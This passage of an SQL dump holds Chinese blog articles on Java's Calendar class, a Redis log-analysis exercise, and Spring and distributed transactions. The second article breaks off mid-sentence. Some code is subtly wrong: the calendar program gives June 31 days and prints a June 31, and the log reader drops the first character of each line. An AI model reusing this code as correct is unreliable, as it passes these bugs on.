Calendar.getInstance();<br />1<br />Calendar类的常用方法：</p>\n<p><br />Calendar 对象可以调用 set() 方法将日历翻到任何一个时间，当参数 year 取负数时表示公元前。Calendar 对象调用 get() 方法可以获取有关年、月、日等时间信息，参数 field 的有效值由 Calendar 静态常量指定。<br />Calendar 类中定义了许多常量，分别表示不同的意义。<br />Calendar.YEAR：年份。<br />Calendar.MONTH：月份。<br />Calendar.DATE：日期。<br />Calendar.DAY_OF_MONTH：日期，和上面的字段意义完全相同。<br />Calendar.HOUR：12小时制的小时。<br />Calendar.HOUR_OF_DAY：24 小时制的小时。<br />Calendar.MINUTE：分钟。<br />Calendar.SECOND：秒。<br />Calendar.DAY_OF_WEEK：星期几。<br />例如，要获取当前月份可用如下代码：<br />int month = Calendar.getInstance().get(Calendar.MONTH);<br />1<br />注意：如果整型变量 month 的值是 0，表示当前日历是在 1 月份；如果值是 11，则表示当前日历在 12 月份。<br />使用 Calendar 类处理日期时间的实例如下：<br />Calendar calendar = Calendar.getInstance(); // 如果不设置时间，则默认为当前时间<br />calendar.setTime(new Date()); // 将系统当前时间赋值给 Calendar 对象<br />System.out.println(\"现在时刻：\" + calendar.getTime()); // 获取当前时间<br />int year = calendar.get(Calendar.YEAR); // 获取当前年份<br />System.out.println(\"现在是\" + year + \"年\");<br />int month = calendar.get(Calendar.MONTH) + 1; // 获取当前月份（月份从 0 开始，所以加 1）<br />System.out.print(month + \"月\");<br />int day = calendar.get(Calendar.DATE); // 获取日<br />System.out.print(day + \"日\");<br />int week = calendar.get(Calendar.DAY_OF_WEEK) - 1; // 获取今天星期几（以星期日为第一天）<br />System.out.print(\"星期\" + week);<br />int hour = calendar.get(Calendar.HOUR_OF_DAY); // 获取当前小时数（24 小时制）<br />System.out.print(hour + \"时\");<br />int minute = calendar.get(Calendar.MINUTE); // 获取当前分钟<br />System.out.print(minute + \"分\");<br />int second = calendar.get(Calendar.SECOND); // 获取当前秒数<br />System.out.print(second + \"秒\");<br />int millisecond = calendar.get(Calendar.MILLISECOND); // 获取毫秒数<br />System.out.print(millisecond + \"毫秒\");<br />int dayOfMonth = calendar.get(Calendar.DAY_OF_MONTH); // 获取今天是本月第几天<br />System.out.println(\"今天是本月的第 \" + dayOfMonth + \" 天\");<br />int dayOfWeekInMonth = calendar.get(Calendar.DAY_OF_WEEK_IN_MONTH); // 获取今天是本月第几周<br />System.out.println(\"今天是本月第 \" + dayOfWeekInMonth + \" 周\");<br />int many = calendar.get(Calendar.DAY_OF_YEAR); // 获取今天是今年第几天<br />System.out.println(\"今天是今年第 \" + many + \" 天\");<br />Calendar c = Calendar.getInstance();<br />c.set(2012, 8, 8); // 设置年月日，时分秒将默认采用当前值<br />System.out.println(\"设置日期为 2012-8-8 后的时间：\" + c.getTime()); // 输出时间<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />打印一个日历：<br />import java.util.Calendar;<br />public class CalendarDemo {<br />public static void main(String[] args) {<br />Calendar calendar = Calendar.getInstance();<br />calendar.set(2016, 5, 1); // 实际的calendar对象所表示的日期为2016年6月1日<br />// 判断2016年6月1日为一周中的第几天<br />int index = calendar.get(Calendar.DAY_OF_WEEK) - 1;<br />char[] title = { \'日\', \'一\', \'二\', \'三\', \'四\', \'五\', \'六\' }; // 存放曰历的头部<br />int daysArray[][] = new int[6][7];// 存放日历的数据<br />int daysInMonth = 31; // 该月的天数<br />int day = 1; // 自动增长<br />for (int i = index; i &lt; 7; i++) {<br />// 填充第一周的日期数据，即日历中的第一行<br />daysArray[0][i] = day++;<br />}<br />for (int i = 1; i &lt; 6; i++) {<br />// 填充其他周的日历数据，控制行<br />for (int j = 0; j &lt; 7; j++) {<br />// 如果当前day表示的是本月最后一天，则停止向数组中继续赋值<br />if (day &gt; daysInMonth) {<br />i = 6;<br />break;<br />}<br />daysArray[i][j] = day++;<br />}<br />}<br />System.out.println(\"------------------2016 年 6 月--------------------\\n\");<br />for (int i = 0; i &lt; title.length; i++) {<br />System.out.print(title[i] + \"\\t\");<br />}<br />System.out.print(\"\\n\");<br />// 输出二元数组daysArray中的元素<br />for (int i = 0; i &lt; 6; i++) {<br />for (int j = 0; j &lt; 7; j++) {<br />if (daysArray[i][j] == 0) {<br />if (i != 0) {<br />// 如果到月末，则完成显示日历的任务，停止该方法的执行<br />return;<br />}<br />System.out.print(\"\\t\");<br />continue;<br />}<br />System.out.print(daysArray[i][j] + \"\\t\");<br />}<br />System.out.print(\"\\n\");<br />}<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />该程序看似复杂其实很简单。因为 Calendar 类所表示的时间月份是 set() 方法中表示月份的参数值 +1，因此 Calendar 类的实际时间为 2016 年 6 月 1 日。在下面的代码中分别获取 6 月 1 日为本周中的第几天，以便在相应的星期下开始输出 6 月份的日历。程序中的 daysArray 是一个二元数组，该二元数组控制了日历的格式输出，第一个子数组控制日历的行，第二个子数组控制曰历的列，即可输出二元数组中的每一个元素。</p>\n<p>------------------2016 年 6 月--------------------</p>\n<p>日 一 二 三 四 五 六<br />1 2 3 4<br />5 6 7 8 9 10 11<br />12 13 14 15 16 17 18<br />19 20 21 22 23 24 25<br />26 27 28 29 30 31 <br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />关于Hashmap的参数讲解：</p>\n<p><br />习题讲解：<br />package 任务C__日志分析;</p>\n<p>import java.io.*;<br />import java.text.ParseException;<br />import java.text.SimpleDateFormat;<br />import java.util.*;<br />import java.util.stream.Collectors;</p>\n<p>/**<br />* @author ${范涛之}<br />* @Description<br />* @create 2021-12-03 10:08<br />*/<br />public class Test {<br />public static void main(String[] args) throws IOException {</p>\n<p><br />List&lt;String&gt; list = new ArrayList&lt;&gt;(); //定义集合<br />int savenum = 0; //定义存盘次数<br />File file = new File(\"D:\\\\C桌面\\\\CSDN学习计划\\\\技术训练营\\\\redis.log\"); //定义文件路径</p>\n<p>/**<br />* 分开写的：<br />*/<br />// InputStreamReader inp = new InputStreamReader(new FileInputStream(file),\"utf-8\");<br />// BufferedReader reader = new BufferedReader(inp);</p>\n<p>/**<br />* 合起来写：<br />*/<br />BufferedReader reader = new BufferedReader<br />(new InputStreamReader(new FileInputStream(new File(String.valueOf(file)))));</p>\n<p><br />/**<br />* 存取文件到list集合中：<br />*/<br />while (reader.read() != -1) {<br />list.add(reader.readLine());<br />}</p>\n<p>/**<br />* 统计存盘次数，以数组中出现关键字&ldquo;DB saved on disk&rdquo;为基准<br />*/<br />List&lt;String&gt; savedCountList = list.stream()<br />.filter(n -&gt; n.contains(\"DB saved on disk\"))<br />.collect(Collectors.toList());<br />for (String x : savedCountList) {<br />savenum++;<br />}<br />// 输出存储数据的次数<br />System.out.println(\"存盘次数为：\" + savenum);</p>\n<p>/**<br />* 统计出最小存盘时间和最大存盘时间<br />*/<br />//开始存储时间的数组。<br />List&lt;String&gt; saveStartTimeList = timeList(list, \"Background saving started by pid\");<br />//调用 toDate 方法，把字符串列表转化为 Date 列表<br />List&lt;Date&gt; saveStartTimeDateList = toDate(saveStartTimeList);</p>\n<p><br />//完成存储时间的数组。<br />List&lt;String&gt; saveEndTimeList = timeList(list, \"DB saved on disk\");</p>\n<p>//调用 toDate 方法，把字符串列表转化为时间列表<br />List&lt;Date&gt; saveEndTimeDateList = toDate(saveEndTimeList);</p>\n<p><br />//存储消耗时间的数组<br />List&lt;Long&gt; saveSpentTimeList = new ArrayList&lt;&gt;();<br />/**<br />* 通过结束时间减去开始时间算出时间差<br />*/<br />for (int i =0;i&lt;saveStartTimeList.size();i++){<br />saveSpentTimeList.add(saveEndTimeDateList.get(i).getTime()-saveStartTimeDateList.get(i).getTime());<br />}<br />long maxSaveTime = saveSpentTimeList.get(0);<br />long minSaveTime = saveSpentTimeList.get(0);<br />/**<br />* 在获取的时间查里面筛选处最大和最小的<br />*/<br />for (int i = 0; i &lt; saveSpentTimeList.size(); i++) {<br />if (saveSpentTimeList.get(i) &lt; minSaveTime) {<br />minSaveTime = saveSpentTimeList.get(i);<br />} else if (saveSpentTimeList.get(i) &gt; maxSaveTime) {<br />maxSaveTime = saveSpentTimeList.get(i);<br />}<br />}<br />//输出最大、最小存储时间<br />System.out.println(\"最大存储时间为：\" + maxSaveTime + \"毫秒\");<br />System.out.println(\"最小存储时间为：\" + minSaveTime + \"毫秒\");</p>\n<p><br />//统计 * 号后出现的单词<br />HashMap&lt;String,Integer&gt; wordMap = new HashMap&lt;&gt;(100);<br />for (String str:list){<br />String[] arr = str.split(\" \");<br />for (int i = 4; i &lt;arr.length; i++) {<br />// 首先判断是否是数字：<br />if (!isNumeric(arr[i])){<br />// 判断集合中有没有这个单词，没有的话就加上，次数加一<br />if (!wordMap.containsKey(arr[i])){<br />wordMap.put(arr[i],1);<br />}<br />else if (wordMap.containsKey(arr[i])){<br />Integer count = wordMap.get(arr[i]);<br />wordMap.replace(arr[i],count+1);<br />}<br />}<br />}<br />}<br />//对 wordMap 中的数据排序<br />List&lt;Map.Entry&lt;String, Integer&gt;&gt; sortedWordMap = new ArrayList&lt;Map.Entry&lt;String, Integer&gt;&gt;(wordMap.entrySet());<br />//输出 * 后出现的单词，及其次数<br />System.out.println(\"单词出现的次数为（降序排列）：\");<br />for (<br />Map.Entry&lt;String, Integer&gt; entry : sortedWordMap) {<br />System.out.println(entry.getKey() + \":\" + entry.getValue() + \" 次\");<br />}</p>\n<p>//统计 pid<br />HashMap&lt;String, Integer&gt; pidMap = new HashMap&lt;&gt;(100);<br />List&lt;String&gt; pidList = list.stream()<br />.filter(s -&gt; s.contains(\"pid\"))<br />.collect(Collectors.toList());</p>\n<p>for (String str : pidList) {<br />String[] arr = str.split(\" \");<br />//因为 pid 在日志中是第 10 个，因此索引为 9<br />//如果集合中没有该 pid，则添加，并且次数记为 1。<br />if (!pidMap.containsKey(arr[9])) {<br />pidMap.put(arr[9], 1);<br />}<br />//如果集合中有该 pid，则将其次数 +1。<br />else if (pidMap.containsKey(arr[9])) {<br />Integer count = pidMap.get(arr[9]);<br />pidMap.replace(arr[9], count + 1);<br />}<br />}<br />//筛选 pidMap 中 value 大于 1 的数据<br />Collection&lt;Integer&gt; values = pidMap.values();<br />while (values.contains(1)) {<br />values.remove(1);<br />}</p>\n<p>List&lt;Map.Entry&lt;String, Integer&gt;&gt; repeatedPidMap = new ArrayList&lt;Map.Entry&lt;String, Integer&gt;&gt;(pidMap.entrySet());<br />//输出重复出现的pid<br />System.out.println(\"重复出现的pid有：\");<br />for (<br />Map.Entry&lt;String, Integer&gt; entry : repeatedPidMap) {<br />System.out.println(entry.getKey() + \":\" + entry.getValue() + \" 次\");<br />}</p>\n<p><br />}</p>\n<p>/**<br />* 会用到的方法：<br />*/<br />//获取时间数组的方法，传入参数为list列表和关键字<br />public static List&lt;String&gt; timeList(List&lt;String&gt; list, String keyword) {<br />List&lt;String&gt; TimeList = new ArrayList&lt;&gt;();<br />list.stream()<br />.filter(s -&gt; s.contains(keyword))<br />.forEach(s -&gt; {<br />s = (s.split(\" \")[1] + \" \" + s.split(\" \")[2]);<br />TimeList.add(s);<br />});<br />return TimeList;<br />}</p>\n<p>// toDate方法：<br />public static List&lt;Date&gt; toDate(List&lt;String&gt; stringList) {<br />SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss.SSS\");<br />List&lt;Date&gt; dateList = new ArrayList&lt;&gt;();<br />for (String s : stringList) {<br />try {<br />Date d = sdf.parse(s);<br />dateList.add(d);<br />} catch (ParseException e) {<br />e.printStackTrace();<br />}<br />}<br />return dateList;<br />}</p>\n<p>//判断字符串是否为数字的方法<br />public static boolean isNumeric(String str) {<br />return str.chars().allMatch(Character::isDigit);<br />}</p>\n<p><br />}</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />75<br />76<br />77<br />78<br />79<br />80<br />81<br />82<br />83<br />84<br />85<br />86<br />87<br />88<br />89<br />90<br />91<br />92<br />93<br />94<br />95<br />96<br />97<br />98<br />99<br />100<br />101<br />102<br />103<br />104<br />105<br />106<br />107<br />108<br />109<br />110<br />111<br />112<br />113<br />114<br />115<br />116<br />117<br />118<br />119<br />120<br />121<br />122<br />123<br />124<br />125<br />126<br />127<br />128<br />129<br />130<br />131<br />132<br />133<br />134<br />135<br />136<br />137<br />138<br />139<br />140<br />141<br />142<br />143<br />144<br />145<br />146<br />147<br />148<br />149<br />150<br />151<br />152<br />153<br />154<br />155<br />156<br />157<br />158<br />159<br />160<br />161<br />162<br />163<br />164<br />165<br />166<br />167<br />168<br />169<br />170<br />171<br />172<br />173<br />174<br />175<br />176<br />177<br />178<br />179<br />180<br />181<br />182<br />183<br />184<br />185<br />186<br />187<br />188<br />189<br />190<br />191<br />192<br />193<br />194<br />195<br />结果截图：</p>\n<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「夜色架构师」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/justleavel/article/details/121692964</p>', '', 1, ',35,', '原创', '公开', '已发布', '', 8949, '', '', 0, '2021-12-05 22:10:47', '2021-12-05 22:10:47');
INSERT INTO `article` VALUES (20, '事务概念梳理', 9, '概述', '<p>一、事务概述<br />事务的主要目的是为了保证数据的一致性，无论是单体系统还是分布式系统，使用事务的目的都是如此。从分层架构的角度来看，底层负责数据存储的数据库为上层所有事务的实现提供了支持，上层的任何事务的实现都需要底层数据库事务的支持。从JDBC再到Spring事务的实现都需要依赖于数据库。<br />而分布式事务由于可能涉及到分布式数据库，所以采取的措施与单体系统中使用的事务有所不同，可以结合数据 库事务也可以采用类似TCC的补偿方案实现事务。<br />总的来说，如果是单体系统不涉及分布式，那么我们可以通过数据库本身提供的事务结合连接工具比如JDBC等保证业务数据的一致性，如果是分布式系统的话，则在CAP理论或者BASE理论的指导下结合具体的手段实现事务的一致性。</p>\n<p>二、事务特性<br />老生常谈，事务必须满足四个特性，简称ACID，如下所示：</p>\n<p>原子性 (atomicity)：原子性是指一个事务是一个不可分割的工作单位，事务中包括的所有操作要么都执行，要么都不执行。只有使事务中所有的数据库操作执行都成功，才算事务执行成功。<br />一致性(consistency)：事务必须使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。一致性也应该是事务的主要目的，原子性与隔离性都应该是为了保证数据的一致性。<br />隔离性 (isolation)：一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，根据隔离的程度可以被划分为四个不同的等级，就是平时说的隔离级别。<br />持久性(durability)：指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。即使接下来出现宕机等情况，也不会对其有任何影响。<br />一致性是事务的最终目的，原子性与隔离性都是为了保证一致性，而持久性是为了保证数据的安全性，即使发生了意外情况，也能保证数据不会出现丢失，导致数据不完成，从而破坏了一致性等，所以，从这个角度来看，持久性也有利于数据一致性，一致性的前提是有数据才行，数据都没了的话，就没有意义了。</p>\n<p>三、数据库事务<br />只要涉及到了数据库事务，首先应该要确认的就是数据库所使用的的隔离级别，隔离级别是事务特性ACID中隔离性的一个可选的等级，以MYSQL为例的话，分为以下四种：</p>\n<p>读未提交（Read Uncommited）<br />已提交读（Read Commited）<br />可重复读（Repeatable Read)<br />串行化<br />最常用的隔离级别应该是读已提交与可重复读，两者处于不加锁与加排它锁的中间状态，相比较于串行化，最大的不同在于读已提交与可重复读隔离级别使用了MVCC机制来保证读写不阻塞，所以，性能会高于串行化，而隔离性强于读未提交.</p>\n<p>四、Spring事务<br />Spring的事务与数据库事务相较而言，由于Spring本身是作为应用层框架，所以，Spring不同于数据库事务之处有两点。<br />第一点是Spring事务为我们提供的不同风格的调用方式，根据风格可以分为编程式与声明式；</p>\n<p>第二点就是由于应用层更多的是方法之间的调用，所以就需要有有对应的策略来处理方法调用时事务应该如何传播，在数据库层面肯定不存在这个问题的，这也相当于是Spring提供的一种增强的工具，在原有事务的基础上结合具体的场景提供了一种灵活设置事务传播策略的增强工具。</p>\n<p><br />编程式与声明式<br />1.编程式事务</p>\n<p>使用Spring提供的工具类Ttempleate实现对事务的控制。<br />简单的说就是在代码中需要直接加入处理事务的逻辑,我们可以在代码中显示的调用控制事务的处理方法。事务的粒度大小可以得到非常灵活的控制，编程式事务可以直接包括住方法内部的代码块。<br />优点：需要执行事务的代码块的粒度可控，比较灵活。</p>\n<p>2.声明式事务</p>\n<p>Spring提供注解或其他方式结合AOP对方法进行增强，加入事务的相关处理，其本质是在容器对定义的Bean执行初始化与实例化时，对方法前后进行拦截,然后在目标方法开始之前创建或者加入一个事务,并将增强后的代理对象注册到IoC容器中。<br />声明式事务最大的优点就是不需要通过编程的方式管理事务，这样就不需要在业务逻辑代码中掺杂事务管理的代码,只需要在配置文件中做相关的事务规则声明(或通过注解@Transaction的方式),便可以将事务规则应用到业务逻辑中。<br />优点：使用配置文件或者注解能够以非侵入式或对代码侵入小的方式对业务方法进行增强，使方法的执行具有事务的特性。</p>\n<p>3.两种方式的比较</p>\n<p>声明式事务管理使业务代码不受污染，只要在方法加上注解就可以获得完全的事务支持。</p>\n<p>和编程式事务相比，声明式事务的最细粒度只能作用到方法级别，无法做到像编程式事务那样可以作用到代码块级别。但是即便有这样的需求，也存在很多变通的方法，比如，可以将需要进行事务管理的代码块独立为方法等等。<br />此外还有一点需要注意的是，如果我们使用配置文件去声明事务方法的话，可能会增加问题排查的难度，因为尽管通过配置文件可以最大程度的做到对业务代码无侵入，但同时也导致了我们在调试代码走流程时会忽视该方法的事务特性，这一点需要注意到，所以，显示的注解或者编程式事务可能会比配置文件配置事务方法的方式好一点。</p>\n<p>事务传播特性</p>\n<p>Spring的事务传播特性可以分为七种，如下所示：</p>\n<p>SUPPORTS：支持当前事务，如果当前没有事务，就以非事务方式执行。<br />REQUIRED：支持当前事务，如果当前没有事务，就新建一个事务。这是最常见的选择，不管有没有事务，反正我这个方法是一定需要事务来保证数据一致性的，必须要有事务，就这个意思。<br />MANDATORY：支持当前事务，如果当前没有事务，就抛出异常。<br />REQUIRES_NEW：如果当前已经存在事务，把当前事务挂起，重新创新一个新的事务，这一事务特性行为强调了独立性。它保证了每个事务状态管理范围内锁使用的数据库连接是彼此不一样的，子方法是需要事务来保证一致性的，但是又不想影响到父方法，万一抛个异常啥的，导致整个大事务都因为我整个小功能回滚了，就不太好了，所以通过该特性来保证独立性。<br />NOT_SUPPORTED：以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。这个意思就是无论你有没有事务，反正我以非事务的方式执行，意在降低事务大小，将非核心的执行逻辑包裹执行，有的方法虽然与数据库交互，但该方法不需要保证一致性，原因可能有很多，不过还是需要注意一点，如果该方法抛出异常还是会导致父方法回滚。<br />NEVER：以非事务方式执行，如果当前存在事务，则抛出异常。<br />NESTED：支持当前事务，如果当前事务存在，则执行一个嵌套事务，如果当前没有事务，就新建一个事务；<br />事务传播特性可以按照其对于当前是否存在事务的处理策略来进行大致的分类，可以帮助梳理自己的思路与加强记忆，如下：</p>\n<p><br />大概梳理一下，方法要不要使用父方法的事务，如果，没有父方法不存在事物，其处理策略是什么样的；以及不支持当前事物的处理策略，按照这个思路进行大致分类,从另一个角度进行梳理，我们在实际开发过程中，对于事务特性的选择，首先是判断方法的独立性，该方法的功能是否不应该影响主业务流程的执行，其功能可能并非业务相关的，此时应该要保证主流程能够稳定执行，增强该方法的独立性。避免因为一个很小的、与业务不相关的点导致整个流程的回滚，或者方法本身就是为主业务流程服务的，所以，需要处于整体业务中，这都需要结合具体的场景进行判断；其次，还需要考虑子方法对于父类事务的要求，子方法是一定需要事务还是一定不需要事务，做出何种反应，是新建事务或者以非事务的方式运行，还是抛出异常。</p>\n<p>事务原理</p>\n<p>Spring的事务的本质依赖于数据库的事务，Spring事务将数据库连接会话对象存储ThreadLocal中，当执行到子方法时，根据当前是否存在事务，再结合子方法的事务传播特性进行处理，比如是否直接抛出异常，或者挂起原事务。如果不需要使用父方法的事务，则将ThreadLocal中的数据库会话对象替换为一个新的会话对象，Spring的事务管理通过ThreadLocal绑定资源、区分数据库会话实现事务的传播特性相关功能，整体可以参考下图：</p>\n<p>&nbsp;</p>\n<p>如果看TransactionTemplate的模板的话，可以发现事务整体执行的流程还是比较简单清晰的，开启事务、执行方法最后提交事务，同时通过try-catch捕获异常并进行回滚，整体流程大致如此。<br />其中比较重要的方法是事务获取、事务提交与事务回滚，这三个方法都被定义在了事务管理器接口 PlatformTransactionManager中，通过该接口可以使事务关注点与数据访问的关注点相分离，通过继承对其进行扩展使其适应不同的数据源。主要的逻辑都是从该接口定义的方法延伸开来的，关于三个方法记录如下：</p>\n<p>事务获取：获取数据库会话对象并将其设置到事务状态对象中，并判断当前是否存在已有事务，并根据传播特性分别进行处理，如果需要开启新事务，则替换事务同步管理器中当前线程的数据库会话对象，通过在ThreadLocal中替换当前线程的数据库连接会话对象实现事务的区分与事务的挂起。<br />事务提交：提交事务，内部会检测事务状态是否设置回滚，因为如果是事务嵌套，形成事务链的情况的话，子方法抛出异常并不会立刻执行回滚，而是设置回滚标识，由父事务统一进行回滚，所以，在事务提交的方法中还需要判断并处理这种情况。<br />事务回滚：如果当前事务存在保存点，则直接回滚到保存点；如果该事务是新建的事务，也可以直接回滚；但是如果当前事务并非一个新的事务，也就是说这个是子方法用的父方法的事务的话，则设置回滚标识，最后由外层事务统一进行回滚。<br />比如说，如果子事务的状态是SUPPORTS 或 REQUIRED或MANDATORY，那么在执行回滚的时候，并不会立刻回滚，只是标记一下回滚状态，当外层事务提交的时候，会先判断ConnectionHolder中的回滚状态，如果已经标记为回滚，则不会提交，而是外层事务进行回滚。关于这一点的话，最初存在一些疑惑，如果抛出了异常触发了回滚，从源码来看异常应该是会一直向上抛的，既然会抛出异常，那必然会被父事务捕获到，并且异常会中断后续代码的执行，除非存在不抛出异常，但也可以触发回滚的方式。后面了解到应该是编程式事务的显示设置，主动设置标识位表示事务需要会被回滚，但同时如果只设置回滚标识，不抛出异常的话，后续的代码也会被执行，这点需要注意到，需保证后续的代码不会影响业务或者数据。</p>\n<p>注意事项<br />Spring声明式事务无法生效的几种情况</p>\n<p>注解@Transactional修饰的方法并非public方式，将导致注解无法生效，但本身并不会报错，增大问题排查的成本等；<br />内部非事务方法调用事务方法时，如果这个非事务方法被外部类对象调用，那么，事务方法也不会生效，因为声明式事务会对事务方法的所属类对象进行增强，生成代理对象，并将其作为域注入到其他类对象中，但是如果内部非事务方法包了一层的话，那么执行非事务方法中事务方法时，事务方法就无法生效了。<br />Spring事务对于非检查异常不会回滚，如果有这个需要的话，我们一般会在注解上标注rollbackFor = Exception.class，编程式事务的话，就直接抛出能触发回滚的异常或者显示设置回滚即可；<br />如果我们使用try-catch把异常捕获后却不抛出，这也将导致无法回滚，这种问题只要看到了就知道怎么回事，但是就怕这个事务方法找起来比较花费时间。<br />Spring事务在多线程环境下可能会失效</p>\n<p>由于Spring事务的实现需要使用ThreadLocal来保存数据库会话连接对象，通过切换这个对象实现事务挂起的相关功能，前提是在同一个线程才可以。毕竟使用的是ThreadLocal，如果我们在事务方法A中开启线程去执行另一个方法B的话，就无法保证A与B能够在同一个事务中执行，可以使用@TransactionalEventListener或TransactionSynchronization接口解决，具体不描述了。</p>\n<p>Spring编程式事务的默认传播特性</p>\n<p>Spring编程式事务的默认传播特性是REQUIRED，如果存在事务则使用当前事务，如果不存在事务，则创建新事务。因为编程式事务是显示开启的，本来认为无论是否存在事务，都是使用自己的事务，但实际并非如此，另外，编程式事务由于是显示的，更便于问题的排查，我们应该尽量使用编程式事务，并且尽量避免嵌套事务，在需要保证事务特性的点上使用编程式事务，其下调用的方法则不必单独使用事务，这样使用的事务的地方统一起来，降低问题排查的成本。</p>\n<p><br />五、分布式事务<br />在分布式系统中，为了保证数据的高可用，通常，数据会被保留到多个副本，这些副本会放置在不同的物理的机器上，以提升数据的分区容错性。为了对用户提供正确的 CRUD 等语义，我们需要保证这些放置在不同物理机器上的副本是一致的，也就是需要保证一致性。分布式事务在现在遍地都是分布式部署的系统中几乎是必要的，但如何实现分布式事务的方法存在多种选择。</p>\n<p>CAP理论<br />CAP 定理是分布式系统设计中最基础，也是最为关键的理论。它指出，分布式数据存储不可能同时满足以下三个条件。</p>\n<p>一致性（Consistency）</p>\n<p>每次读取要么获得最近写入的数据，要么获得一个错误。</p>\n<p>可用性（Availability）</p>\n<p>每次请求都能获得（非错误）响应，但不保证是最新数据。</p>\n<p>分区容忍（Partition tolerance）</p>\n<p>尽管存在消息被节点间的网络丢失（或延迟），系统仍继续运行。<br />CAP 定理表明，在存在网络分区的情况下，一致性和可用性必须二选一。当网络发生分区（不同节点之间的网络发生故障或者延迟较大）时，要么失去一致性（允许不同分区的数据写入），要么失去可用性（识别到网络分区时停止服务）。<br />而在没有发生网络故障时，即分布式系统正常运行时，一致性和可用性是可以同时被满足的。这里需要注意的是，CAP 定理中的一致性与 ACID 数据库事务中的一致性截然不同。ACID 的 C 指的是事务不能破坏任何数据库规则，如键的唯一性。与之相比，CAP 的 C 仅指单一副本这个意义上的一致性，因此只是 ACID 一致性约束的一个严格的子集。</p>\n<p>BASE理论</p>\n<p>BASE理论（基本可用，软（过渡）状态，最终一致性），BASE理论是在CAP理论的三种刚性要求基础上提出的折中方案，思想是根据业务场景，在可容忍范围内，尽量保障用户体验及服务可用。</p>\n<p>Basically Available：基本可用</p>\n<p>系统即便在发生部分故障的情况下，也能保持基本可用的状态。</p>\n<p>Soft State：软（过渡）状态</p>\n<p>软状态指的是，允许存在中间存在数据不一致的情况，</p>\n<p>Eventually Consistency：达到最终一致</p>\n<p>尽管存在数据不一致的状态，但是最终数据能够达到一致性。<br />BASE理论是对CAP中一致性和可用性权衡的结果，其来源于对大规模互联网系统分布式实践的总结，也是基于CAP定理逐步演化而来的吗，且实用性更强的一种方案。BASE理论的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。</p>\n<p>分布式事务<br />分布式事务与单机事务一样都是由一组操作序列组成，不同的是单机事务只是在单机上执行，而分布式事务则是在多台机器上执行，尽管分布式提升了系统的性能，但也增加了一些其他的因素，比如在分布式事务需要考虑到网络延迟的影响。<br />分布式事务同样具有ACID四个特性，但是因为分布式数据库的分布特性，使其又有一些不同。例如，为了保证分布式事务的原子性，必须保证组成该全局事务的所有子事务要么全部提交，要么全部回滚，不允许出现有些子事务提交，而有的子事务回滚。<br />因此，在分布式事务执行的过程中，要比单机事务复杂的多，因为分布式事务除了要保证各个子事务的ACID特性外，还需要对这些子事务进行协调，决定各个子事务的提交与回滚，以保证全局事务的ACID特性。</p>\n<p>两阶段提交协议<br />两阶段提交协议是为了实现分布式事务提交而采用的协议。其基本思想是把全局事务的提交分为如下两个阶段：</p>\n<p>决定阶段：由协调者向各个参与者发出&ldquo;预提交&rdquo;（Prepare）命令，然后等待应答，若所有的参与者返回&ldquo;准备提交&rdquo;（Ready）应答，则该事务满足提交条件。如果至少有一个子事务返回&ldquo;准备废弃&rdquo;（Abort）应答，则该事务不能提交；<br />执行阶段：在事务具备提交条件的情况下，协调者向各个参与者发出&ldquo;提交&rdquo;命令，各个参与者执行提交；否则，协调者向各个参与者发出&ldquo;回滚&rdquo;命令，各个参与者执行回滚，放弃对数据库的修改。无论是&ldquo;提交&rdquo;还是&ldquo;回滚&rdquo;，各参与者执行完毕后都需要向协调者返回&ldquo;确认&rdquo;应答，通知协调者事务执行结束。<br />二阶段提交协议原理比价简单，实现方便，但是不幸的事，二阶段提交还是有几个缺点的：</p>\n<p>同步阻塞：一旦参与者在等待其他参与者响应的过程中，它将无法再执行其他任何操作.<br />单点问题：一旦协调者故障了，参与者将得不到任何请求，一直处于锁定事务资源状态，无法继续完成事务.<br />数据不一致：在事务提交阶段，出现局部网络异常，导致部分协调者未接收到commit请求，就会造成已经接收到commit请求的参与者与未接到commit请求的参与者数据不一致.<br />容错机制太过保守：任何节点的失败都会导致整个事务的失败.<br />三阶段提交协议</p>\n<p>三阶段提交协议是两阶段的改进版本，将2PC的提交事务阶段一分为二，这样就变成了三阶段，分别是CanCommit，PreCommit，DoCommit三个阶段。</p>\n<p>CanCommit阶段：首先进行，事务询问即协调者向参与者发送CanCommit请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应。当参与者接到请求之后，若其自身认为可以顺利执行事务，则返回Yes响应，并进入预备状态。否则反馈No；<br 